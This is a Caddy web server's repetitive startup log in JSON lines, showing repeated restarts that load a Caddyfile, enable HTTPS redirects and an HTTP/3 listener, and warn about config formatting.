{"level":"info","ts":1784791122.6964803,"msg":"maxprocs: Leaving GOMAXPROCS=8: CPU quota undefined"}
{"level":"info","ts":1784791122.6964803,"msg":"GOMEMLIMIT is updated","GOMEMLIMIT":15325020979,"previous":9223372036854775807}
{"level":"info","ts":1784791122.6964803,"msg":"using config from file","file":"Caddyfile"}
{"level":"info","ts":1784791122.6964803,"msg":"adapted config to JSON","adapter":"caddyfile"}
{"level":"warn","ts":1784791122.6964803,"msg":"Caddyfile input is not formatted; run 'caddy fmt --overwrite' to fix inconsistencies","adapter":"caddyfile","file":"Caddyfile","line":2}
{"level":"info","ts":1784791122.7173853,"logger":"admin","msg":"admin endpoint started","address":"localhost:2019","enforce_origin":false,"origins":["//localhost:2019","//[::1]:2019","//127.0.0.1:2019"]}
{"level":"info","ts":1784791122.7179685,"logger":"tls.cache.maintenance","msg":"started background certificate maintenance","cache":"0x2bc1b7d5dd80"}
{"level":"info","ts":1784791122.719067,"logger":"http.auto_https","msg":"skipping automatic certificate management because one or more matching certificates are already loaded","domain":"kairang.pe.kr","server_name":"srv0"}
{"level":"info","ts":1784791122.719067,"logger":"http.auto_https","msg":"enabling automatic HTTP->HTTPS redirects","server_name":"srv0"}
{"level":"info","ts":1784791122.7213578,"logger":"http","msg":"enabling HTTP/3 listener","addr":":8443"}
{"level":"info","ts":1784791122.7224436,"logger":"http.log","msg":"server running","name":"srv0","protocols":["h1","h2","h3"]}
{"level":"warn","ts":1784791122.7224436,"logger":"http","msg":"HTTP/2 skipped because it requires TLS","network":"tcp","addr":":80"}
{"level":"warn","ts":1784791122.7224436,"logger":"http","msg":"HTTP/3 skipped because it requires TLS","network":"tcp","addr":":80"}
{"level":"info","ts":1784791122.7224436,"logger":"http.log","msg":"server running","name":"remaining_auto_https_redirects","protocols":["h1","h2","h3"]}
{"level":"info","ts":1784791122.7235274,"msg":"autosaved config (load with --resume flag)","file":"C:\\Users\\jason004\\AppData\\Roaming\\Caddy\\autosave.json"}
{"level":"info","ts":1784791122.7235274,"msg":"serving initial configuration"}
{"level":"info","ts":1784791122.7251463,"logger":"tls","msg":"storage cleaning happened too recently; skipping for now","storage":"FileStorage:C:\\Users\\jason004\\AppData\\Roaming\\Caddy","instance":"505fc9e2-bb4f-4c7b-b4f1-7ef35dc840dc","try_again":1784877522.7251463,"try_again_in":86400}
{"level":"info","ts":1784791122.7257001,"logger":"tls","msg":"finished cleaning storage units"}
{"level":"info","ts":1784791167.1776466,"msg":"maxprocs: Leaving GOMAXPROCS=8: CPU quota undefined"}
{"level":"info","ts":1784791167.1776466,"msg":"GOMEMLIMIT is updated","GOMEMLIMIT":15325020979,"previous":9223372036854775807}
{"level":"info","ts":1784791167.1776466,"msg":"using config from file","file":"Caddyfile"}
{"level":"info","ts":1784791167.1776466,"msg":"adapted config to JSON","adapter":"caddyfile"}
{"level":"warn","ts":1784791167.1776466,"msg":"Caddyfile input is not formatted; run 'caddy fmt --overwrite' to fix inconsistencies","adapter":"caddyfile","file":"Caddyfile","line":2}
{"level":"info","ts":1784791167.1944497,"logger":"admin","msg":"admin endpoint started","address":"localhost:2019","enforce_origin":false,"origins":["//localhost:2019","//[::1]:2019","//127.0.0.1:2019"]}
{"level":"info","ts":1784791167.194976,"logger":"tls.cache.maintenance","msg":"started background certificate maintenance","cache":"0x2d0d44e95980"}
{"level":"info","ts":1784791167.1967733,"logger":"http.auto_https","msg":"skipping automatic certificate management because one or more matching certificates are already loaded","domain":"kairang.pe.kr","server_name":"srv0"}
{"level":"info","ts":1784791167.1967733,"logger":"http.auto_https","msg":"enabling automatic HTTP->HTTPS redirects","server_name":"srv0"}
{"level":"info","ts":1784791167.1980019,"logger":"http","msg":"enabling HTTP/3 listener","addr":":8443"}
{"level":"info","ts":1784791167.1985784,"logger":"http.log","msg":"server running","name":"srv0","protocols":["h1","h2","h3"]}
{"level":"warn","ts":1784791167.1991653,"logger":"http","msg":"HTTP/2 skipped because it requires TLS","network":"tcp","addr":":80"}
{"level":"warn","ts":1784791167.1991653,"logger":"http","msg":"HTTP/3 skipped because it requires TLS","network":"tcp","addr":":80"}
{"level":"info","ts":1784791167.1991653,"logger":"http.log","msg":"server running","name":"remaining_auto_https_redirects","protocols":["h1","h2","h3"]}
{"level":"info","ts":1784791167.1996846,"msg":"autosaved config (load with --resume flag)","file":"C:\\Users\\jason004\\AppData\\Roaming\\Caddy\\autosave.json"}
{"level":"info","ts":1784791167.1996846,"msg":"serving initial configuration"}
{"level":"info","ts":1784791167.2115047,"logger":"tls","msg":"storage cleaning happened too recently; skipping for now","storage":"FileStorage:C:\\Users\\jason004\\AppData\\Roaming\\Caddy","instance":"505fc9e2-bb4f-4c7b-b4f1-7ef35dc840dc","try_again":1784877567.2115047,"try_again_in":86400}
{"level":"info","ts":1784791167.2115047,"logger":"tls","msg":"finished cleaning storage units"}
{"level":"info","ts":1784791524.136344,"msg":"maxprocs: Leaving GOMAXPROCS=8: CPU quota undefined"}
{"level":"info","ts":1784791524.136344,"msg":"GOMEMLIMIT is updated","GOMEMLIMIT":15325020979,"previous":9223372036854775807}
{"level":"info","ts":1784791524.136344,"msg":"using config from file","file":"Caddyfile"}
{"level":"info","ts":1784791524.136344,"msg":"adapted config to JSON","adapter":"caddyfile"}
{"level":"warn","ts":1784791524.136344,"msg":"Caddyfile input is not formatted; run 'caddy fmt --overwrite' to fix inconsistencies","adapter":"caddyfile","file":"Caddyfile","line":2}
{"level":"info","ts":1784791524.1551132,"logger":"admin","msg":"admin endpoint started","address":"localhost:2019","enforce_origin":false,"origins":["//localhost:2019","//[::1]:2019","//127.0.0.1:2019"]}
{"level":"info","ts":1784791524.155663,"logger":"tls.cache.maintenance","msg":"started background certificate maintenance","cache":"0x29520befeb80"}
{"level":"info","ts":1784791524.15741,"logger":"http.auto_https","msg":"skipping automatic certificate management because one or more matching certificates are already loaded","domain":"kairang.pe.kr","server_name":"srv0"}
{"level":"info","ts":1784791524.15741,"logger":"http.auto_https","msg":"enabling automatic HTTP->HTTPS redirects","server_name":"srv0"}
{"level":"info","ts":1784791524.16009,"logger":"http","msg":"enabling HTTP/3 listener","addr":":8443"}
{"level":"info","ts":1784791524.1606133,"logger":"http.log","msg":"server running","name":"srv0","protocols":["h1","h2","h3"]}
{"level":"warn","ts":1784791524.1606133,"logger":"http","msg":"HTTP/2 skipped because it requires TLS","network":"tcp","addr":":80"}
{"level":"warn","ts":1784791524.1611607,"logger":"http","msg":"HTTP/3 skipped because it requires TLS","network":"tcp","addr":":80"}
{"level":"info","ts":1784791524.1611607,"logger":"http.log","msg":"server running","name":"remaining_auto_https_redirects","protocols":["h1","h2","h3"]}
{"level":"info","ts":1784791524.161678,"msg":"autosaved config (load with --resume flag)","file":"C:\\Users\\jason004\\AppData\\Roaming\\Caddy\\autosave.json"}
{"level":"info","ts":1784791524.161678,"msg":"serving initial configuration"}
{"level":"info","ts":1784791524.1690621,"logger":"tls","msg":"storage cleaning happened too recently; skipping for now","storage":"FileStorage:C:\\Users\\jason004\\AppData\\Roaming\\Caddy","instance":"505fc9e2-bb4f-4c7b-b4f1-7ef35dc840dc","try_again":1784877924.1690621,"try_again_in":86400}
{"level":"info","ts":1784791524.1696856,"logger":"tls","msg":"finished cleaning storage units"}
{"level":"info","ts":1784792130.3003068,"msg":"maxprocs: Leaving GOMAXPROCS=8: CPU quota undefined"}
{"level":"info","ts":1784792130.3008351,"msg":"GOMEMLIMIT is updated","GOMEMLIMIT":15325020979,"previous":9223372036854775807}
{"level":"info","ts":1784792130.3008351,"msg":"using config from file","file":"Caddyfile"}
{"level":"info","ts":1784792130.3008351,"msg":"adapted config to JSON","adapter":"caddyfile"}
{"level":"warn","ts":1784792130.3008351,"msg":"Caddyfile input is not formatted; run 'caddy fmt --overwrite' to fix inconsistencies","adapter":"caddyfile","file":"Caddyfile","line":2}
{"level":"info","ts":1784792130.321567,"logger":"admin","msg":"admin endpoint started","address":"localhost:2019","enforce_origin":false,"origins":["//localhost:2019","//[::1]:2019","//127.0.0.1:2019"]}
{"level":"info","ts":1784792130.322098,"logger":"tls.cache.maintenance","msg":"started background certificate maintenance","cache":"0x396390730d00"}
{"level":"info","ts":1784792130.3239045,"logger":"http.auto_https","msg":"skipping automatic certificate management because one or more matching certificates are already loaded","domain":"kairang.pe.kr","server_name":"srv0"}
{"level":"info","ts":1784792130.3239045,"logger":"http.auto_https","msg":"enabling automatic HTTP->HTTPS redirects","server_name":"srv0"}
{"level":"info","ts":1784792130.325485,"logger":"http","msg":"enabling HTTP/3 listener","addr":":8443"}
{"level":"info","ts":1784792130.3260174,"logger":"http.log","msg":"server running","name":"srv0","protocols":["h1","h2","h3"]}
{"level":"warn","ts":1784792130.3260174,"logger":"http","msg":"HTTP/2 skipped because it requires TLS","network":"tcp","addr":":80"}
{"level":"warn","ts":1784792130.3260174,"logger":"http","msg":"HTTP/3 skipped because it requires TLS","network":"tcp","addr":":80"}
{"level":"info","ts":1784792130.3260174,"logger":"http.log","msg":"server running","name":"remaining_auto_https_redirects","protocols":["h1","h2","h3"]}
{"level":"info","ts":1784792130.3265526,"msg":"autosaved config (load with --resume flag)","file":"C:\\Users\\jason004\\AppData\\Roaming\\Caddy\\autosave.json"}
{"level":"info","ts":1784792130.3265526,"msg":"serving initial configuration"}
{"level":"info","ts":1784792130.3292432,"logger":"tls","msg":"storage cleaning happened too recently; skipping for now","storage":"FileStorage:C:\\Users\\jason004\\AppData\\Roaming\\Caddy","instance":"505fc9e2-bb4f-4c7b-b4f1-7ef35dc840dc","try_again":1784878530.3292432,"try_again_in":86400}
{"level":"info","ts":1784792130.3297796,"logger":"tls","msg":"finished cleaning storage units"}
{"level":"info","ts":1784792196.525927,"msg":"maxprocs: Leaving GOMAXPROCS=8: CPU quota undefined"}
{"level":"info","ts":1784792196.525927,"msg":"GOMEMLIMIT is updated","GOMEMLIMIT":15325020979,"previous":9223372036854775807}
{"level":"info","ts":1784792196.525927,"msg":"using config from file","file":"Caddyfile"}
{"level":"info","ts":1784792196.525927,"msg":"adapted config to JSON","adapter":"caddyfile"}
{"level":"warn","ts":1784792196.525927,"msg":"Caddyfile input is not formatted; run 'caddy fmt --overwrite' to fix inconsistencies","adapter":"caddyfile","file":"Caddyfile","line":2}
{"level":"info","ts":1784792196.5426254,"logger":"admin","msg":"admin endpoint started","address":"localhost:2019","enforce_origin":false,"origins":["//localhost:2019","//[::1]:2019","//127.0.0.1:2019"]}
{"level":"info","ts":1784792196.5426254,"logger":"tls.cache.maintenance","msg":"started background certificate maintenance","cache":"0x2d50a5d18780"}
{"level":"info","ts":1784792196.5444462,"logger":"http.auto_https","msg":"skipping automatic certificate management because one or more matching certificates are already loaded","domain":"kairang.pe.kr","server_name":"srv0"}
{"level":"info","ts":1784792196.5444462,"logger":"http.auto_https","msg":"enabling automatic HTTP->HTTPS redirects","server_name":"srv0"}
{"level":"info","ts":1784792196.5466523,"logger":"http","msg":"enabling HTTP/3 listener","addr":":8443"}
{"level":"info","ts":1784792196.5473847,"logger":"http.log","msg":"server running","name":"srv0","protocols":["h1","h2","h3"]}
{"level":"warn","ts":1784792196.5479143,"logger":"http","msg":"HTTP/2 skipped because it requires TLS","network":"tcp","addr":":80"}
{"level":"warn","ts":1784792196.5479143,"logger":"http","msg":"HTTP/3 skipped because it requires TLS","network":"tcp","addr":":80"}
{"level":"info","ts":1784792196.5479143,"logger":"http.log","msg":"server running","name":"remaining_auto_https_redirects","protocols":["h1","h2","h3"]}
{"level":"info","ts":1784792196.5484827,"msg":"autosaved config (load with --resume flag)","file":"C:\\Users\\jason004\\AppData\\Roaming\\Caddy\\autosave.json"}
{"level":"info","ts":1784792196.5484827,"msg":"serving initial configuration"}
{"level":"info","ts":1784792196.558714,"logger":"tls","msg":"storage cleaning happened too recently; skipping for now","storage":"FileStorage:C:\\Users\\jason004\\AppData\\Roaming\\Caddy","instance":"505fc9e2-bb4f-4c7b-b4f1-7ef35dc840dc","try_again":1784878596.558714,"try_again_in":86400}
{"level":"info","ts":1784792196.5593457,"logger":"tls","msg":"finished cleaning storage units"}
{"level":"info","ts":1784792300.7746198,"msg":"maxprocs: Leaving GOMAXPROCS=8: CPU quota undefined"}
{"level":"info","ts":1784792300.7746198,"msg":"GOMEMLIMIT is updated","GOMEMLIMIT":15325020979,"previous":9223372036854775807}
{"level":"info","ts":1784792300.7746198,"msg":"using config from file","file":"Caddyfile"}
{"level":"info","ts":1784792300.7746198,"msg":"adapted config to JSON","adapter":"caddyfile"}
{"level":"warn","ts":1784792300.7746198,"msg":"Caddyfile input is not formatted; run 'caddy fmt --overwrite' to fix inconsistencies","adapter":"caddyfile","file":"Caddyfile","line":2}
{"level":"info","ts":1784792300.7960835,"logger":"admin","msg":"admin endpoint started","address":"localhost:2019","enforce_origin":false,"origins":["//localhost:2019","//[::1]:2019","//127.0.0.1:2019"]}
{"level":"info","ts":1784792300.796589,"logger":"tls.cache.maintenance","msg":"started background certificate maintenance","cache":"0x1cd39f941500"}
{"level":"info","ts":1784792300.7977052,"logger":"http.auto_https","msg":"skipping automatic certificate management because one or more matching certificates are already loaded","domain":"kairang.pe.kr","server_name":"srv0"}
{"level":"info","ts":1784792300.7977052,"logger":"http.auto_https","msg":"enabling automatic HTTP->HTTPS redirects","server_name":"srv0"}
{"level":"warn","ts":1784792300.7993019,"logger":"http","msg":"HTTP/2 skipped because it requires TLS","network":"tcp","addr":":80"}
{"level":"warn","ts":1784792300.7993019,"logger":"http","msg":"HTTP/3 skipped because it requires TLS","network":"tcp","addr":":80"}
{"level":"info","ts":1784792300.7993019,"logger":"http.log","msg":"server running","name":"remaining_auto_https_redirects","protocols":["h1","h2","h3"]}
{"level":"info","ts":1784792300.7993019,"logger":"http","msg":"enabling HTTP/3 listener","addr":":8443"}
{"level":"info","ts":1784792300.799837,"logger":"http.log","msg":"server running","name":"srv0","protocols":["h1","h2","h3"]}
{"level":"info","ts":1784792300.800383,"msg":"autosaved config (load with --resume flag)","file":"C:\\Users\\jason004\\AppData\\Roaming\\Caddy\\autosave.json"}
{"level":"info","ts":1784792300.800383,"msg":"serving initial configuration"}
{"level":"info","ts":1784792300.8038003,"logger":"tls","msg":"storage cleaning happened too recently; skipping for now","storage":"FileStorage:C:\\Users\\jason004\\AppData\\Roaming\\Caddy","instance":"505fc9e2-bb4f-4c7b-b4f1-7ef35dc840dc","try_again":1784878700.8038003,"try_again_in":86400}
{"level":"info","ts":1784792300.8038003,"logger":"tls","msg":"finished cleaning storage units"}
{"level":"info","ts":1784794731.0381732,"msg":"maxprocs: Leaving GOMAXPROCS=8: CPU quota undefined"}
{"level":"info","ts":1784794731.0381732,"msg":"GOMEMLIMIT is updated","GOMEMLIMIT":15325020979,"previous":9223372036854775807}
{"level":"info","ts":1784794731.0381732,"msg":"using config from file","file":"Caddyfile"}
{"level":"info","ts":1784794731.0381732,"msg":"adapted config to JSON","adapter":"caddyfile"}
{"level":"warn","ts":1784794731.0381732,"msg":"Caddyfile input is not formatted; run 'caddy fmt --overwrite' to fix inconsistencies","adapter":"caddyfile","file":"Caddyfile","line":2}
{"level":"info","ts":1784794731.0576677,"logger":"admin","msg":"admin endpoint started","address":"localhost:2019","enforce_origin":false,"origins":["//localhost:2019","//[::1]:2019","//127.0.0.1:2019"]}
{"level":"info","ts":1784794731.058173,"logger":"tls.cache.maintenance","msg":"started background certificate maintenance","cache":"0x2206ce0ca180"}
{"level":"info","ts":1784794731.0593147,"logger":"http.auto_https","msg":"skipping automatic certificate management because one or more matching certificates are already loaded","domain":"kairang.pe.kr","server_name":"srv0"}
{"level":"info","ts":1784794731.0593147,"logger":"http.auto_https","msg":"enabling automatic HTTP->HTTPS redirects","server_name":"srv0"}
{"level":"info","ts":1784794731.0609586,"logger":"http","msg":"enabling HTTP/3 listener","addr":":8443"}
{"level":"info","ts":1784794731.0617497,"logger":"http.log","msg":"server running","name":"srv0","protocols":["h1","h2","h3"]}
{"level":"warn","ts":1784794731.0617497,"logger":"http","msg":"HTTP/2 skipped because it requires TLS","network":"tcp","addr":":80"}
{"level":"warn","ts":1784794731.0617497,"logger":"http","msg":"HTTP/3 skipped because it requires TLS","network":"tcp","addr":":80"}
{"level":"info","ts":1784794731.0617497,"logger":"http.log","msg":"server running","name":"remaining_auto_https_redirects","protocols":["h1","h2","h3"]}
{"level":"info","ts":1784794731.0629368,"msg":"autosaved config (load with --resume flag)","file":"C:\\Users\\jason004\\AppData\\Roaming\\Caddy\\autosave.json"}
{"level":"info","ts":1784794731.0629368,"msg":"serving initial configuration"}
{"level":"info","ts":1784794731.0742602,"logger":"tls","msg":"storage cleaning happened too recently; skipping for now","storage":"FileStorage:C:\\Users\\jason004\\AppData\\Roaming\\Caddy","instance":"505fc9e2-bb4f-4c7b-b4f1-7ef35dc840dc","try_again":1784881131.0742602,"try_again_in":86400}
{"level":"info","ts":1784794731.0742602,"logger":"tls","msg":"finished cleaning storage units"}
{"level":"info","ts":1784794927.3639083,"msg":"maxprocs: Leaving GOMAXPROCS=8: CPU quota undefined"}
{"level":"info","ts":1784794927.3639083,"msg":"GOMEMLIMIT is updated","GOMEMLIMIT":15325020979,"previous":9223372036854775807}
{"level":"info","ts":1784794927.3639083,"msg":"using config from file","file":"Caddyfile"}
{"level":"info","ts":1784794927.3639083,"msg":"adapted config to JSON","adapter":"caddyfile"}
{"level":"warn","ts":1784794927.3639083,"msg":"Caddyfile input is not formatted; run 'caddy fmt --overwrite' to fix inconsistencies","adapter":"caddyfile","file":"Caddyfile","line":2}
{"level":"info","ts":1784794927.3807414,"logger":"admin","msg":"admin endpoint started","address":"localhost:2019","enforce_origin":false,"origins":["//localhost:2019","//[::1]:2019","//127.0.0.1:2019"]}
{"level":"info","ts":1784794927.3807414,"logger":"tls.cache.maintenance","msg":"started background certificate maintenance","cache":"0x55338ee5b00"}
{"level":"info","ts":1784794927.3824952,"logger":"http.auto_https","msg":"skipping automatic certificate management because one or more matching certificates are already loaded","domain":"kairang.pe.kr","server_name":"srv0"}
{"level":"info","ts":1784794927.3824952,"logger":"http.auto_https","msg":"enabling automatic HTTP->HTTPS redirects","server_name":"srv0"}
{"level":"info","ts":1784794927.385958,"logger":"http","msg":"enabling HTTP/3 listener","addr":":8443"}
{"level":"info","ts":1784794927.3865292,"logger":"http.log","msg":"server running","name":"srv0","protocols":["h1","h2","h3"]}
{"level":"warn","ts":1784794927.3865292,"logger":"http","msg":"HTTP/2 skipped because it requires TLS","network":"tcp","addr":":80"}
{"level":"warn","ts":1784794927.3865292,"logger":"http","msg":"HTTP/3 skipped because it requires TLS","network":"tcp","addr":":80"}
{"level":"info","ts":1784794927.3865292,"logger":"http.log","msg":"server running","name":"remaining_auto_https_redirects","protocols":["h1","h2","h3"]}
{"level":"info","ts":1784794927.3870883,"msg":"autosaved config (load with --resume flag)","file":"C:\\Users\\jason004\\AppData\\Roaming\\Caddy\\autosave.json"}
{"level":"info","ts":1784794927.3870883,"msg":"serving initial configuration"}
{"level":"info","ts":1784794927.397813,"logger":"tls","msg":"storage cleaning happened too recently; skipping for now","storage":"FileStorage:C:\\Users\\jason004\\AppData\\Roaming\\Caddy","instance":"505fc9e2-bb4f-4c7b-b4f1-7ef35dc840dc","try_again":1784881327.397813,"try_again_in":86400}
{"level":"info","ts":1784794927.398357,"logger":"tls","msg":"finished cleaning storage units"}
{"level":"info","ts":1784795497.1942754,"msg":"maxprocs: Leaving GOMAXPROCS=8: CPU quota undefined"}
{"level":"info","ts":1784795497.194859,"msg":"GOMEMLIMIT is updated","GOMEMLIMIT":15325020979,"previous":9223372036854775807}
{"level":"info","ts":1784795497.194859,"msg":"using config from file","file":"Caddyfile"}
{"level":"info","ts":1784795497.194859,"msg":"adapted config to JSON","adapter":"caddyfile"}
{"level":"warn","ts":1784795497.194859,"msg":"Caddyfile input is not formatted; run 'caddy fmt --overwrite' to fix inconsistencies","adapter":"caddyfile","file":"Caddyfile","line":2}
{"level":"info","ts":1784795497.2118504,"logger":"admin","msg":"admin endpoint started","address":"localhost:2019","enforce_origin":false,"origins":["//localhost:2019","//[::1]:2019","//127.0.0.1:2019"]}
{"level":"info","ts":1784795497.2118504,"logger":"tls.cache.maintenance","msg":"started background certificate maintenance","cache":"0x34c33c035a80"}
{"level":"info","ts":1784795497.2134404,"logger":"http.auto_https","msg":"skipping automatic certificate management because one or more matching certificates are already loaded","domain":"kairang.pe.kr","server_name":"srv0"}
{"level":"info","ts":1784795497.2134404,"logger":"http.auto_https","msg":"enabling automatic HTTP->HTTPS redirects","server_name":"srv0"}
{"level":"info","ts":1784795497.2150674,"logger":"http","msg":"enabling HTTP/3 listener","addr":":8443"}
{"level":"info","ts":1784795497.2150674,"logger":"http.log","msg":"server running","name":"srv0","protocols":["h1","h2","h3"]}
{"level":"warn","ts":1784795497.2156188,"logger":"http","msg":"HTTP/2 skipped because it requires TLS","network":"tcp","addr":":80"}
{"level":"warn","ts":1784795497.2156188,"logger":"http","msg":"HTTP/3 skipped because it requires TLS","network":"tcp","addr":":80"}
{"level":"info","ts":1784795497.2156188,"logger":"http.log","msg":"server running","name":"remaining_auto_https_redirects","protocols":["h1","h2","h3"]}
{"level":"info","ts":1784795497.2161717,"msg":"autosaved config (load with --resume flag)","file":"C:\\Users\\jason004\\AppData\\Roaming\\Caddy\\autosave.json"}
{"level":"info","ts":1784795497.2161717,"msg":"serving initial configuration"}
{"level":"info","ts":1784795497.2192807,"logger":"tls","msg":"storage cleaning happened too recently; skipping for now","storage":"FileStorage:C:\\Users\\jason004\\AppData\\Roaming\\Caddy","instance":"505fc9e2-bb4f-4c7b-b4f1-7ef35dc840dc","try_again":1784881897.2192807,"try_again_in":86400}
{"level":"info","ts":1784795497.2198296,"logger":"tls","msg":"finished cleaning storage units"}
{"level":"info","ts":1784795730.0593905,"msg":"maxprocs: Leaving GOMAXPROCS=8: CPU quota undefined"}
{"level":"info","ts":1784795730.0593905,"msg":"GOMEMLIMIT is updated","GOMEMLIMIT":15325020979,"previous":9223372036854775807}
{"level":"info","ts":1784795730.0593905,"msg":"using config from file","file":"Caddyfile"}
{"level":"info","ts":1784795730.0593905,"msg":"adapted config to JSON","adapter":"caddyfile"}
{"level":"warn","ts":1784795730.0593905,"msg":"Caddyfile input is not formatted; run 'caddy fmt --overwrite' to fix inconsistencies","adapter":"caddyfile","file":"Caddyfile","line":2}
{"level":"info","ts":1784795730.0763304,"logger":"admin","msg":"admin endpoint started","address":"localhost:2019","enforce_origin":false,"origins":["//[::1]:2019","//127.0.0.1:2019","//localhost:2019"]}
{"level":"info","ts":1784795730.0768359,"logger":"tls.cache.maintenance","msg":"started background certificate maintenance","cache":"0x1f1ae9521c80"}
{"level":"info","ts":1784795730.078043,"logger":"http.auto_https","msg":"skipping automatic certificate management because one or more matching certificates are already loaded","domain":"kairang.pe.kr","server_name":"srv0"}
{"level":"info","ts":1784795730.078043,"logger":"http.auto_https","msg":"enabling automatic HTTP->HTTPS redirects","server_name":"srv0"}
{"level":"info","ts":1784795730.0798075,"logger":"http","msg":"enabling HTTP/3 listener","addr":":8443"}
{"level":"info","ts":1784795730.0803437,"logger":"http.log","msg":"server running","name":"srv0","protocols":["h1","h2","h3"]}
{"level":"warn","ts":1784795730.0803437,"logger":"http","msg":"HTTP/2 skipped because it requires TLS","network":"tcp","addr":":80"}
{"level":"warn","ts":1784795730.0803437,"logger":"http","msg":"HTTP/3 skipped because it requires TLS","network":"tcp","addr":":80"}
{"level":"info","ts":1784795730.0803437,"logger":"http.log","msg":"server running","name":"remaining_auto_https_redirects","protocols":["h1","h2","h3"]}
{"level":"info","ts":1784795730.0814688,"msg":"autosaved config (load with --resume flag)","file":"C:\\Users\\jason004\\AppData\\Roaming\\Caddy\\autosave.json"}
{"level":"info","ts":1784795730.0814688,"msg":"serving initial configuration"}
{"level":"info","ts":1784795730.0950792,"logger":"tls","msg":"storage cleaning happened too recently; skipping for now","storage":"FileStorage:C:\\Users\\jason004\\AppData\\Roaming\\Caddy","instance":"505fc9e2-bb4f-4c7b-b4f1-7ef35dc840dc","try_again":1784882130.0950792,"try_again_in":86400}
{"level":"info","ts":1784795730.0950792,"logger":"tls","msg":"finished cleaning storage units"}
{"level":"info","ts":1784795993.8771446,"msg":"maxprocs: Leaving GOMAXPROCS=8: CPU quota undefined"}
{"level":"info","ts":1784795993.8776646,"msg":"GOMEMLIMIT is updated","GOMEMLIMIT":15325020979,"previous":9223372036854775807}
{"level":"info","ts":1784795993.8776646,"msg":"using config from file","file":"Caddyfile"}
{"level":"info","ts":1784795993.8776646,"msg":"adapted config to JSON","adapter":"caddyfile"}
{"level":"warn","ts":1784795993.8776646,"msg":"Caddyfile input is not formatted; run 'caddy fmt --overwrite' to fix inconsistencies","adapter":"caddyfile","file":"Caddyfile","line":2}
{"level":"info","ts":1784795993.897541,"logger":"admin","msg":"admin endpoint started","address":"localhost:2019","enforce_origin":false,"origins":["//localhost:2019","//[::1]:2019","//127.0.0.1:2019"]}
{"level":"info","ts":1784795993.898067,"logger":"tls.cache.maintenance","msg":"started background certificate maintenance","cache":"0x390dd3f6ba00"}
{"level":"info","ts":1784795993.9008458,"logger":"http.auto_https","msg":"skipping automatic certificate management because one or more matching certificates are already loaded","domain":"kairang.pe.kr","server_name":"srv0"}
{"level":"info","ts":1784795993.9008458,"logger":"http.auto_https","msg":"enabling automatic HTTP->HTTPS redirects","server_name":"srv0"}
{"level":"info","ts":1784795993.9024365,"logger":"http","msg":"enabling HTTP/3 listener","addr":":8443"}
{"level":"info","ts":1784795993.9024365,"logger":"http.log","msg":"server running","name":"srv0","protocols":["h1","h2","h3"]}
{"level":"warn","ts":1784795993.9029624,"logger":"http","msg":"HTTP/2 skipped because it requires TLS","network":"tcp","addr":":80"}
{"level":"warn","ts":1784795993.9029624,"logger":"http","msg":"HTTP/3 skipped because it requires TLS","network":"tcp","addr":":80"}
{"level":"info","ts":1784795993.9029624,"logger":"http.log","msg":"server running","name":"remaining_auto_https_redirects","protocols":["h1","h2","h3"]}
{"level":"info","ts":1784795993.9034936,"msg":"autosaved config (load with --resume flag)","file":"C:\\Users\\jason004\\AppData\\Roaming\\Caddy\\autosave.json"}
{"level":"info","ts":1784795993.9034936,"msg":"serving initial configuration"}
{"level":"info","ts":1784795993.907237,"logger":"tls","msg":"storage cleaning happened too recently; skipping for now","storage":"FileStorage:C:\\Users\\jason004\\AppData\\Roaming\\Caddy","instance":"505fc9e2-bb4f-4c7b-b4f1-7ef35dc840dc","try_again":1784882393.907237,"try_again_in":86400}
{"level":"info","ts":1784795993.9077692,"logger":"tls","msg":"finished cleaning storage units"}
{"level":"info","ts":1784796176.5797296,"msg":"maxprocs: Leaving GOMAXPROCS=8: CPU quota undefined"}
{"level":"info","ts":1784796176.580274,"msg":"GOMEMLIMIT is updated","GOMEMLIMIT":15325020979,"previous":9223372036854775807}
{"level":"info","ts":1784796176.580274,"msg":"using config from file","file":"Caddyfile"}
{"level":"info","ts":1784796176.580274,"msg":"adapted config to JSON","adapter":"caddyfile"}
{"level":"warn","ts":1784796176.580274,"msg":"Caddyfile input is not formatted; run 'caddy fmt --overwrite' to fix inconsistencies","adapter":"caddyfile","file":"Caddyfile","line":2}
{"level":"info","ts":1784796176.5976732,"logger":"admin","msg":"admin endpoint started","address":"localhost:2019","enforce_origin":false,"origins":["//127.0.0.1:2019","//localhost:2019","//[::1]:2019"]}
{"level":"info","ts":1784796176.5976732,"logger":"tls.cache.maintenance","msg":"started background certificate maintenance","cache":"0x378308bf0400"}
{"level":"info","ts":1784796176.598862,"logger":"http.auto_https","msg":"skipping automatic certificate management because one or more matching certificates are already loaded","domain":"kairang.pe.kr","server_name":"srv0"}
{"level":"info","ts":1784796176.598862,"logger":"http.auto_https","msg":"enabling automatic HTTP->HTTPS redirects","server_name":"srv0"}
{"level":"info","ts":1784796176.600814,"logger":"http","msg":"enabling HTTP/3 listener","addr":":8443"}
{"level":"info","ts":1784796176.6013482,"logger":"http.log","msg":"server running","name":"srv0","protocols":["h1","h2","h3"]}
{"level":"warn","ts":1784796176.6013482,"logger":"http","msg":"HTTP/2 skipped because it requires TLS","network":"tcp","addr":":80"}
{"level":"warn","ts":1784796176.6013482,"logger":"http","msg":"HTTP/3 skipped because it requires TLS","network":"tcp","addr":":80"}
{"level":"info","ts":1784796176.6013482,"logger":"http.log","msg":"server running","name":"remaining_auto_https_redirects","protocols":["h1","h2","h3"]}
{"level":"info","ts":1784796176.6018815,"msg":"autosaved config (load with --resume flag)","file":"C:\\Users\\jason004\\AppData\\Roaming\\Caddy\\autosave.json"}
{"level":"info","ts":1784796176.6018815,"msg":"serving initial configuration"}
{"level":"info","ts":1784796176.6046345,"logger":"tls","msg":"storage cleaning happened too recently; skipping for now","storage":"FileStorage:C:\\Users\\jason004\\AppData\\Roaming\\Caddy","instance":"505fc9e2-bb4f-4c7b-b4f1-7ef35dc840dc","try_again":1784882576.6046345,"try_again_in":86400}
{"level":"info","ts":1784796176.6046345,"logger":"tls","msg":"finished cleaning storage units"}
{"level":"info","ts":1784797288.1506805,"msg":"maxprocs: Leaving GOMAXPROCS=8: CPU quota undefined"}
{"level":"info","ts":1784797288.1506805,"msg":"GOMEMLIMIT is updated","GOMEMLIMIT":15325020979,"previous":9223372036854775807}
{"level":"info","ts":1784797288.1506805,"msg":"using config from file","file":"Caddyfile"}
{"level":"info","ts":1784797288.1506805,"msg":"adapted config to JSON","adapter":"caddyfile"}
{"level":"warn","ts":1784797288.1506805,"msg":"Caddyfile input is not formatted; run 'caddy fmt --overwrite' to fix inconsistencies","adapter":"caddyfile","file":"Caddyfile","line":2}
